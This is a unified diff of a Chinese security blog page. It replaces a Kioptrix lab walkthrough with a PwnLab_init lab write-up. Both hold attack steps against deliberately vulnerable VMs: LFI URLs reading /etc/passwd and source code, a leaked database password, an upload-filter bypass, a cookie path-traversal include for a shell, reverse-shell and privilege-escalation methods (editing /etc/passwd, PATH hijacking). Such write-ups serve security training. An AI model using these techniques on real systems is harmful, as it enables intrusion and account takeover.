@@ -6,7 +6,7 @@
     
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    Kioptrix全集 |  岛
+    Pwnlab_init |  岛
   </title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   
@@ -32,7 +32,7 @@
   <div id="app">
     <main class="content">
       <section class="outer">
-  <article id="post-Kioptrix全集" class="article article-type-post" itemscope
+  <article id="post-Pwnlab-init" class="article article-type-post" itemscope
   itemprop="blogPost" data-scroll-reveal>
 
   <div class="article-inner">
@@ -40,7 +40,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  Kioptrix全集
+  Pwnlab_init
 </h1>
   
 
@@ -49,8 +49,8 @@
 
     
     <div class="article-meta">
-      <a href="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/" class="article-date">
-  <time datetime="2020-03-07T08:11:41.000Z" itemprop="datePublished">2020-03-07</time>
+      <a href="/2020/03/12/Pwnlab-init/" class="article-date">
+  <time datetime="2020-03-12T14:22:07.000Z" itemprop="datePublished">2020-03-12</time>
 </a>
       
       
@@ -60,7 +60,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> 字数统计:</span>
-            <span class="post-count">564字</span>
+            <span class="post-count">202字</span>
         </span>
     </span>
 
@@ -69,7 +69,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> 阅读时长≈</span>
-            <span class="post-count">2分钟</span>
+            <span class="post-count">1分钟</span>
         </span>
     </span>
 </div>
@@ -96,114 +96,137 @@
       
 
       
-      <h1 id="0x00-Kioptrix-Level-1"><a href="#0x00-Kioptrix-Level-1" class="headerlink" title="0x00 Kioptrix_Level_1"></a><strong>0x00 Kioptrix_Level_1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307161830148.png" alt="image-20200307161830148"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307162355257.png" alt="image-20200307162355257"></p>
-<p>利用Samba溢出</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307165821506.png" alt="image-20200307165821506"></p>
-<p>还可以利用Apache OpenSSL漏洞溢出，不展示了。</p>
-<h1 id="0x01-Kioptrix-Level-1-1"><a href="#0x01-Kioptrix-Level-1-1" class="headerlink" title="0x01 Kioptrix_Level_1.1"></a><strong>0x01 Kioptrix_Level_1.1</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170524511.png" alt="image-20200307170524511"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307170918034.png" alt="image-20200307170918034"></p>
-<p>80的index.php web基础考试来了 想起了考pte的时候</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171747660.png" alt="image-20200307171747660"></p>
-<p>命令执行</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171841255.png" alt="image-20200307171841255"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307171849863.png" alt="image-20200307171849863"></p>
-<p>那不客气了 bash弹shell 注意；因为前面的是ping</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172121951.png" alt="image-20200307172121951"></p>
-<p>nc接到</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172251783.png" alt="image-20200307172251783"></p>
-<p>提权 看下版本</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307172603208.png" alt="image-20200307172603208"></p>
-<p>这里我们用到了exploitdb的 <a href="https://www.exploit-db.com/download/9542" target="_blank" rel="noopener">https://www.exploit-db.com/download/9542</a></p>
-<p>python3 -m http.server 9999 开个http</p>
-<p>编译命令gcc -o 9542 9542.c</p>
-<p>记得在tmp因为有执行权限这目录 源文件下载下来后缀改成.c编译完就是9542了</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307173559780.png" alt="image-20200307173559780"></p>
-<p>闯关成功！</p>
-<h1 id="0x02-Kioptrix-Level-1-2"><a href="#0x02-Kioptrix-Level-1-2" class="headerlink" title="0x02 Kioptrix_Level_1.2"></a><strong>0x02 Kioptrix_Level_1.2</strong></h1><p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307174435555.png" alt="image-20200307174435555"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307175301323.png" alt="image-20200307175301323"></p>
-<p>利用方式很多</p>
-<ul>
-<li>Gallarific<ul>
-<li>gallery.php SQL Injection</li>
-</ul>
-</li>
-<li>LotusCMS<ul>
-<li>RCE</li>
-<li>Code Inject</li>
-</ul>
-</li>
-</ul>
-<p>dirb开始 扫出挺多</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307180238145.png" alt="image-20200307180238145"></p>
-<p>做下host</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181159138.png" alt="image-20200307181159138"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181450474.png" alt="image-20200307181450474"></p>
-<p>msf我们用太多了 oscp考试限制msf使用的 那么这次我们从SQL Injection入手</p>
-<p>在exploit-db上搜索Gallarific的漏洞</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181638504.png" alt="image-20200307181638504"></p>
-<p>注入点：<a href="http://www.site.com/gallery.php?id=null" target="_blank" rel="noopener">www.site.com/gallery.php?id=null</a></p>
-<p>sqlmap跑这个 <a href="http://192.168.0.106/gallery/gallery.php?id=1" target="_blank" rel="noopener">http://192.168.0.106/gallery/gallery.php?id=1</a></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307181924830.png" alt="image-20200307181924830"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183256152.png" alt="image-20200307183256152"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183221579.png" alt="image-20200307183221579"></p>
-<p>很久没升级sqlmap了….</p>
-<p>md5解完就是Mast3r和starwars</p>
-<p>loneferret / starwars 22走一波 </p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307183819289.png" alt="image-20200307183819289"></p>
-<p>根据提示 sudo ht</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185119942.png" alt="image-20200307185119942"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307184036261.png" alt="image-20200307184036261"></p>
-<p>按F3 打开一个文件 /etc/passwd(或者/etc/sudoers) 编辑loneferrt那一行把1000和100 分别改为0，CTRL+W 保存，如图：</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185258898.png" alt="image-20200307185258898"></p>
-<p>提权成功</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307185504768.png" alt="image-20200307185504768"></p>
-<h1 id="0x03-Kioptrix-Level-1-3"><a href="#0x03-Kioptrix-Level-1-3" class="headerlink" title="0x03 Kioptrix_Level_1.3"></a><strong>0x03 Kioptrix_Level_1.3</strong></h1><p>这个包下载下来是个vmdk</p>
-<p>需要我们把上一个刚打完的虚拟机硬盘移除倒入这个</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191650536.png" alt="image-20200307191650536"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307191852194.png" alt="image-20200307191852194"></p>
-<p>看看80 先使用nmap通过NetBIOS枚举用户名</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307230439585.png" alt="image-20200307230439585"></p>
-<p>扫出来的账户加万能密码尝试登陆</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231412153.png" alt="image-20200307231412153"></p>
-<p>操作如下</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231835651.png" alt="image-20200307231835651"></p>
-<p>数据库账号拿到</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307231942745.png" alt="image-20200307231942745"></p>
-<p>用<strong>sys_exec</strong>运行usermod命令来授予john管理员权限！</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200307232351752.png" alt="image-20200307232351752"></p>
-<p>Root 😘</p>
-<h1 id="0x04-Kioptrix-2014"><a href="#0x04-Kioptrix-2014" class="headerlink" title="0x04 Kioptrix 2014"></a><strong>0x04 Kioptrix 2014</strong></h1><p>信息收集</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230108891.png" alt="image-20200308230108891"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230743780.png" alt="image-20200308230743780"></p>
-<p>仅有80和8080端口开着，用的还是Apache 2.2.21服务的</p>
-<p>看来这把是考纯web啊 </p>
-<p>80啥也没有 8080有限制，什么时候都要看下robots和源码 发现了隐藏路径</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308230928179.png" alt="image-20200308230928179"></p>
-<p>pChart后台</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231027189.png" alt="image-20200308231027189"></p>
-<p>kali搜下漏洞 看下exp了解到是本地文件包含 那就包吧</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231214272.png" alt="image-20200308231214272"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231309781.png" alt="image-20200308231309781"></p>
-<p>利用方式</p>
-<p>hxxp://localhost/examples/index.php？Action=View&amp;Script=%2f..%2f..%2fetc/passwd</p>
-<p>成了</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231522658.png" alt="image-20200308231522658"></p>
-<p>同理再看下apache配置 为啥8080 ban我 </p>
-<p>哦😯 火狐4.0的UA就可以了 我这用的是google的插件</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308231744308.png" alt="image-20200308231744308"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232050054.png" alt="image-20200308232050054"></p>
-<p>phptax远程代码执行漏洞</p>
-<p>msf干净利索</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232653182.png" alt="image-20200308232653182"></p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308232732265.png" alt="image-20200308232732265"></p>
-<p>差个提权 用的FreeBSD 9.0</p>
-<p>kali再搜一下 nc传文件</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235321104.png" alt="image-20200308235321104"></p>
-<p>如下操作提权成功</p>
-<p><img src="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/image-20200308235715954.png" alt="image-20200308235715954"></p>
-<p>至此Kioptrix剧中😘</p>
-<h2 id><a href="#" class="headerlink" title></a></h2>
+      <p>0x00 信息收集</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312222253552.png" alt="image-20200312222253552"></p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312222520688.png" alt="image-20200312222520688"></p>
+<p>发现80端口的url是这样的</p>
+<p> <a href="http://192.168.0.104/?page=login" target="_blank" rel="noopener">http://192.168.0.104/?page=login</a><br> <a href="http://192.168.0.104/?page=upload" target="_blank" rel="noopener">http://192.168.0.104/?page=upload</a></p>
+<ol>
+<li>可能存在 LFI 漏洞</li>
+<li>构造URL <a href="http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login" target="_blank" rel="noopener">http://192.168.0.104/?page=php://filter/convert.base64-encode/resource=login</a></li>
+<li>发现可以包含读到文件，然后base64解密</li>
+</ol>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312223045306.png" alt="image-20200312223045306"></p>
+<p>代码如下</p>
+<p>—login.php—</p>
+<?php
+session_start();
+require("config.php");
+$mysqli = new mysqli($server, $username, $password, $database);
+
+if (isset($_POST['user']) and isset($_POST['pass']))
+{
+    $luser = $_POST['user'];
+    $lpass = base64_encode($_POST['pass']);
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$stmt &#x3D; $mysqli-&gt;prepare(&quot;SELECT * FROM users WHERE user&#x3D;? AND pass&#x3D;?&quot;);</span><br><span class="line">$stmt-&gt;bind_param(&#39;ss&#39;, $luser, $lpass);</span><br><span class="line"></span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;store_Result();</span><br><span class="line"></span><br><span class="line">if ($stmt-&gt;num_rows &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">    $_SESSION[&#39;user&#39;] &#x3D; $luser;</span><br><span class="line">    header(&#39;Location: ?page&#x3D;upload&#39;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Login failed.&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table>
+}
+else
+{
+    ?>
+
+<pre><code>&lt;form action=&quot;&quot; method=&quot;POST&quot;&gt;
+&lt;label&gt;Username: &lt;/label&gt;&lt;input id=&quot;user&quot; type=&quot;test&quot; name=&quot;user&quot;&gt;&lt;br /&gt;
+&lt;label&gt;Password: &lt;/label&gt;&lt;input id=&quot;pass&quot; type=&quot;password&quot; name=&quot;pass&quot;&gt;&lt;br /&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot;&gt;
+&lt;/form&gt;</code></pre><p>​    &lt;?php<br>}</p>
+<p>跟着再把<code>require</code>中的config读出来</p>
+<p><code>&lt;?php
+$server   = &quot;localhost&quot;;
+$username = &quot;root&quot;;
+$password = &quot;H4u%QJ_H99&quot;;
+$database = &quot;Users&quot;;
+?&gt;%</code></p>
+<p>顺便也把index和upload的也读了</p>
+<p>—index—<br><?php
+//Multilingual. Not implemented yet.
+//setcookie("lang","en.lang.php");
+if (isset($_COOKIE['lang']))
+{
+    include("lang/".$_COOKIE['lang']);
+}
+// Not implemented yet.
+?></p>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+  <meta name="generator" content="hexo-theme-yilia-plus">
+<link rel="alternate" href="/atom.xml" title="岛" type="application/atom+xml">
+</head>
+<body>
+<center>
+<img src="images/pwnlab.png"><br>
+[ <a href="/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr><br>
+<?php
+    if (isset($_GET['page']))
+    {
+        include($_GET['page'].".php");
+    }
+    else
+    {
+        echo "Use this server to upload and share image files inside the intranet";
+    }
+?>
+</center>
+</body>
+</html>% 
+
+<p>—upload—</p>
+<?php
+session_start();
+if (!isset($_SESSION['user'])) { die('You must be log in.'); }
+?>
+<html>
+    <body>
+        <form action method="post" enctype="multipart/form-data">
+            <input type="file" name="file" id="file">
+            <input type="submit" name="submit" value="Upload">
+        </form>
+    </body>
+</html>
+<?php 
+if(isset($_POST['submit'])) {
+    if ($_FILES['file']['error'] <= 0) {
+        $filename  = $_FILES['file']['name'];
+        $filetype  = $_FILES['file']['type'];
+        $uploaddir = 'upload/';
+        $file_ext  = strrchr($filename, '.');
+        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
+        $whitelist = array(".jpg",".jpeg",".gif",".png"); 
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    if (!(in_array($file_ext, $whitelist))) &#123;</span><br><span class="line">        die(&#39;Not allowed extension, please upload images only.&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(strpos($filetype,&#39;image&#39;) &#x3D;&#x3D;&#x3D; false) &#123;</span><br><span class="line">        die(&#39;Error 001&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;gif&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpeg&#39; &amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;jpg&#39;&amp;&amp; $imageinfo[&#39;mime&#39;] !&#x3D; &#39;image&#x2F;png&#39;) &#123;</span><br><span class="line">        die(&#39;Error 002&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(substr_count($filetype, &#39;&#x2F;&#39;)&gt;1)&#123;</span><br><span class="line">        die(&#39;Error 003&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $uploadfile &#x3D; $uploaddir . md5(basename($_FILES[&#39;file&#39;][&#39;name&#39;])).$file_ext;</span><br><span class="line"></span><br><span class="line">    if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $uploadfile)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;\&quot;&quot;.$uploadfile.&quot;\&quot;&gt;&lt;br &#x2F;&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        die(&#39;Error 4&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table>
+<p>}</p>
+<p>?&gt;%</p>
+<p>在上面已经拿到了MySQL的账号密码了，而且在用nmap扫的时候已经发现3306端口是开放的。</p>
+<p>mysql -h 192.168.0.104 -u root -D Users -p密码是config文件的那个</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312224817346.png" alt="image-20200312224817346"></p>
+<p>拿到用户名</p>
+<h1 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01 Bypass"></a><strong>0x01 Bypass</strong></h1><p>登录上传文件试试，上面的源码已经知道只能上传图片后缀的文件，而且还判了文件类型和mime</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312225323119.png" alt="image-20200312225323119"></p>
+<p>加个图片标志绕过</p>
+<p>burp上传回来个相对路径 upload/51c65dd716e81189745d6eb1c9f1bb6b.gif</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312230453184.png" alt="image-20200312230453184"></p>
+<p>让他弹回来 用cookie传入路径</p>
+<p>curl –cookie “lang=../upload/51c65dd716e81189745d6eb1c9f1bb6b.gif” “<a href="http://192.168.0.104&quot;" target="_blank" rel="noopener">http://192.168.0.104&quot;</a></p>
+<p>拿到了</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312231440117.png" alt="image-20200312231440117"></p>
+<p>python -c ‘import pty;pty.spawn(“/bin/bash”)’ 获取一个tty</p>
+<p>用之前数据库里拿到的三个账号尝试登陆</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312231648685.png" alt="image-20200312231648685"></p>
+<h1 id="0x02-提权"><a href="#0x02-提权" class="headerlink" title="0x02 提权"></a><strong>0x02 提权</strong></h1><p>思路是这样的</p>
+<p>1.从截图可以看到，这是一个ELF 32位 LSB执行文件，但是当我们执行文件的时候，报错了</p>
+<p>2.通过报错信息我们可以看到msgmike调用cat命令读取/home/mike/msg.txt文件</p>
+<p>针对这种情况，我们可以通过设置bash的$path环境变量来利用</p>
+<p>3.然而当我们调用cat命令的时候，cat会从以上目录来寻找，如果我们添加.到$PATH环境变量，</p>
+<p>4.则会先从当前目录来寻找cat指令，相当于我们自己创建一个读文件的cat指令，用这个指令来</p>
+<p>5.读新建取/home/mike/msg.txt文件，我们新建一个cat文件，并添加执行权限</p>
+<p>6.这样当我们再次运行./msgmike命令的时候，就会触发当前目录下的cat(/bin/sh)，</p>
+<p>我们就会提升到mike权限</p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312232750822.png" alt="image-20200312232750822"></p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312232900069.png" alt="image-20200312232900069"></p>
+<p><img src="/2020/03/12/Pwnlab-init/image-20200312232907099.png" alt="image-20200312232907099"></p>
+
       
       <!-- reward -->
       
@@ -272,7 +295,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://yoursite.com/2020/03/12/Pwnlab-init/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -288,19 +311,10 @@
   
   <nav class="article-nav">
     
-      <a href="/2020/03/12/Pwnlab-init/" class="article-nav-link">
-        <strong class="article-nav-caption">上一篇</strong>
-        <div class="article-nav-title">
-          
-            Pwnlab_init
-          
-        </div>
-      </a>
     
-    
-      <a href="/2020/03/06/DerpnStink/" class="article-nav-link">
+      <a href="/2020/03/07/Kioptrix%E5%85%A8%E9%9B%86/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">DerpnStink</div>
+        <div class="article-nav-title">Kioptrix全集</div>
       </a>
     
   </nav>
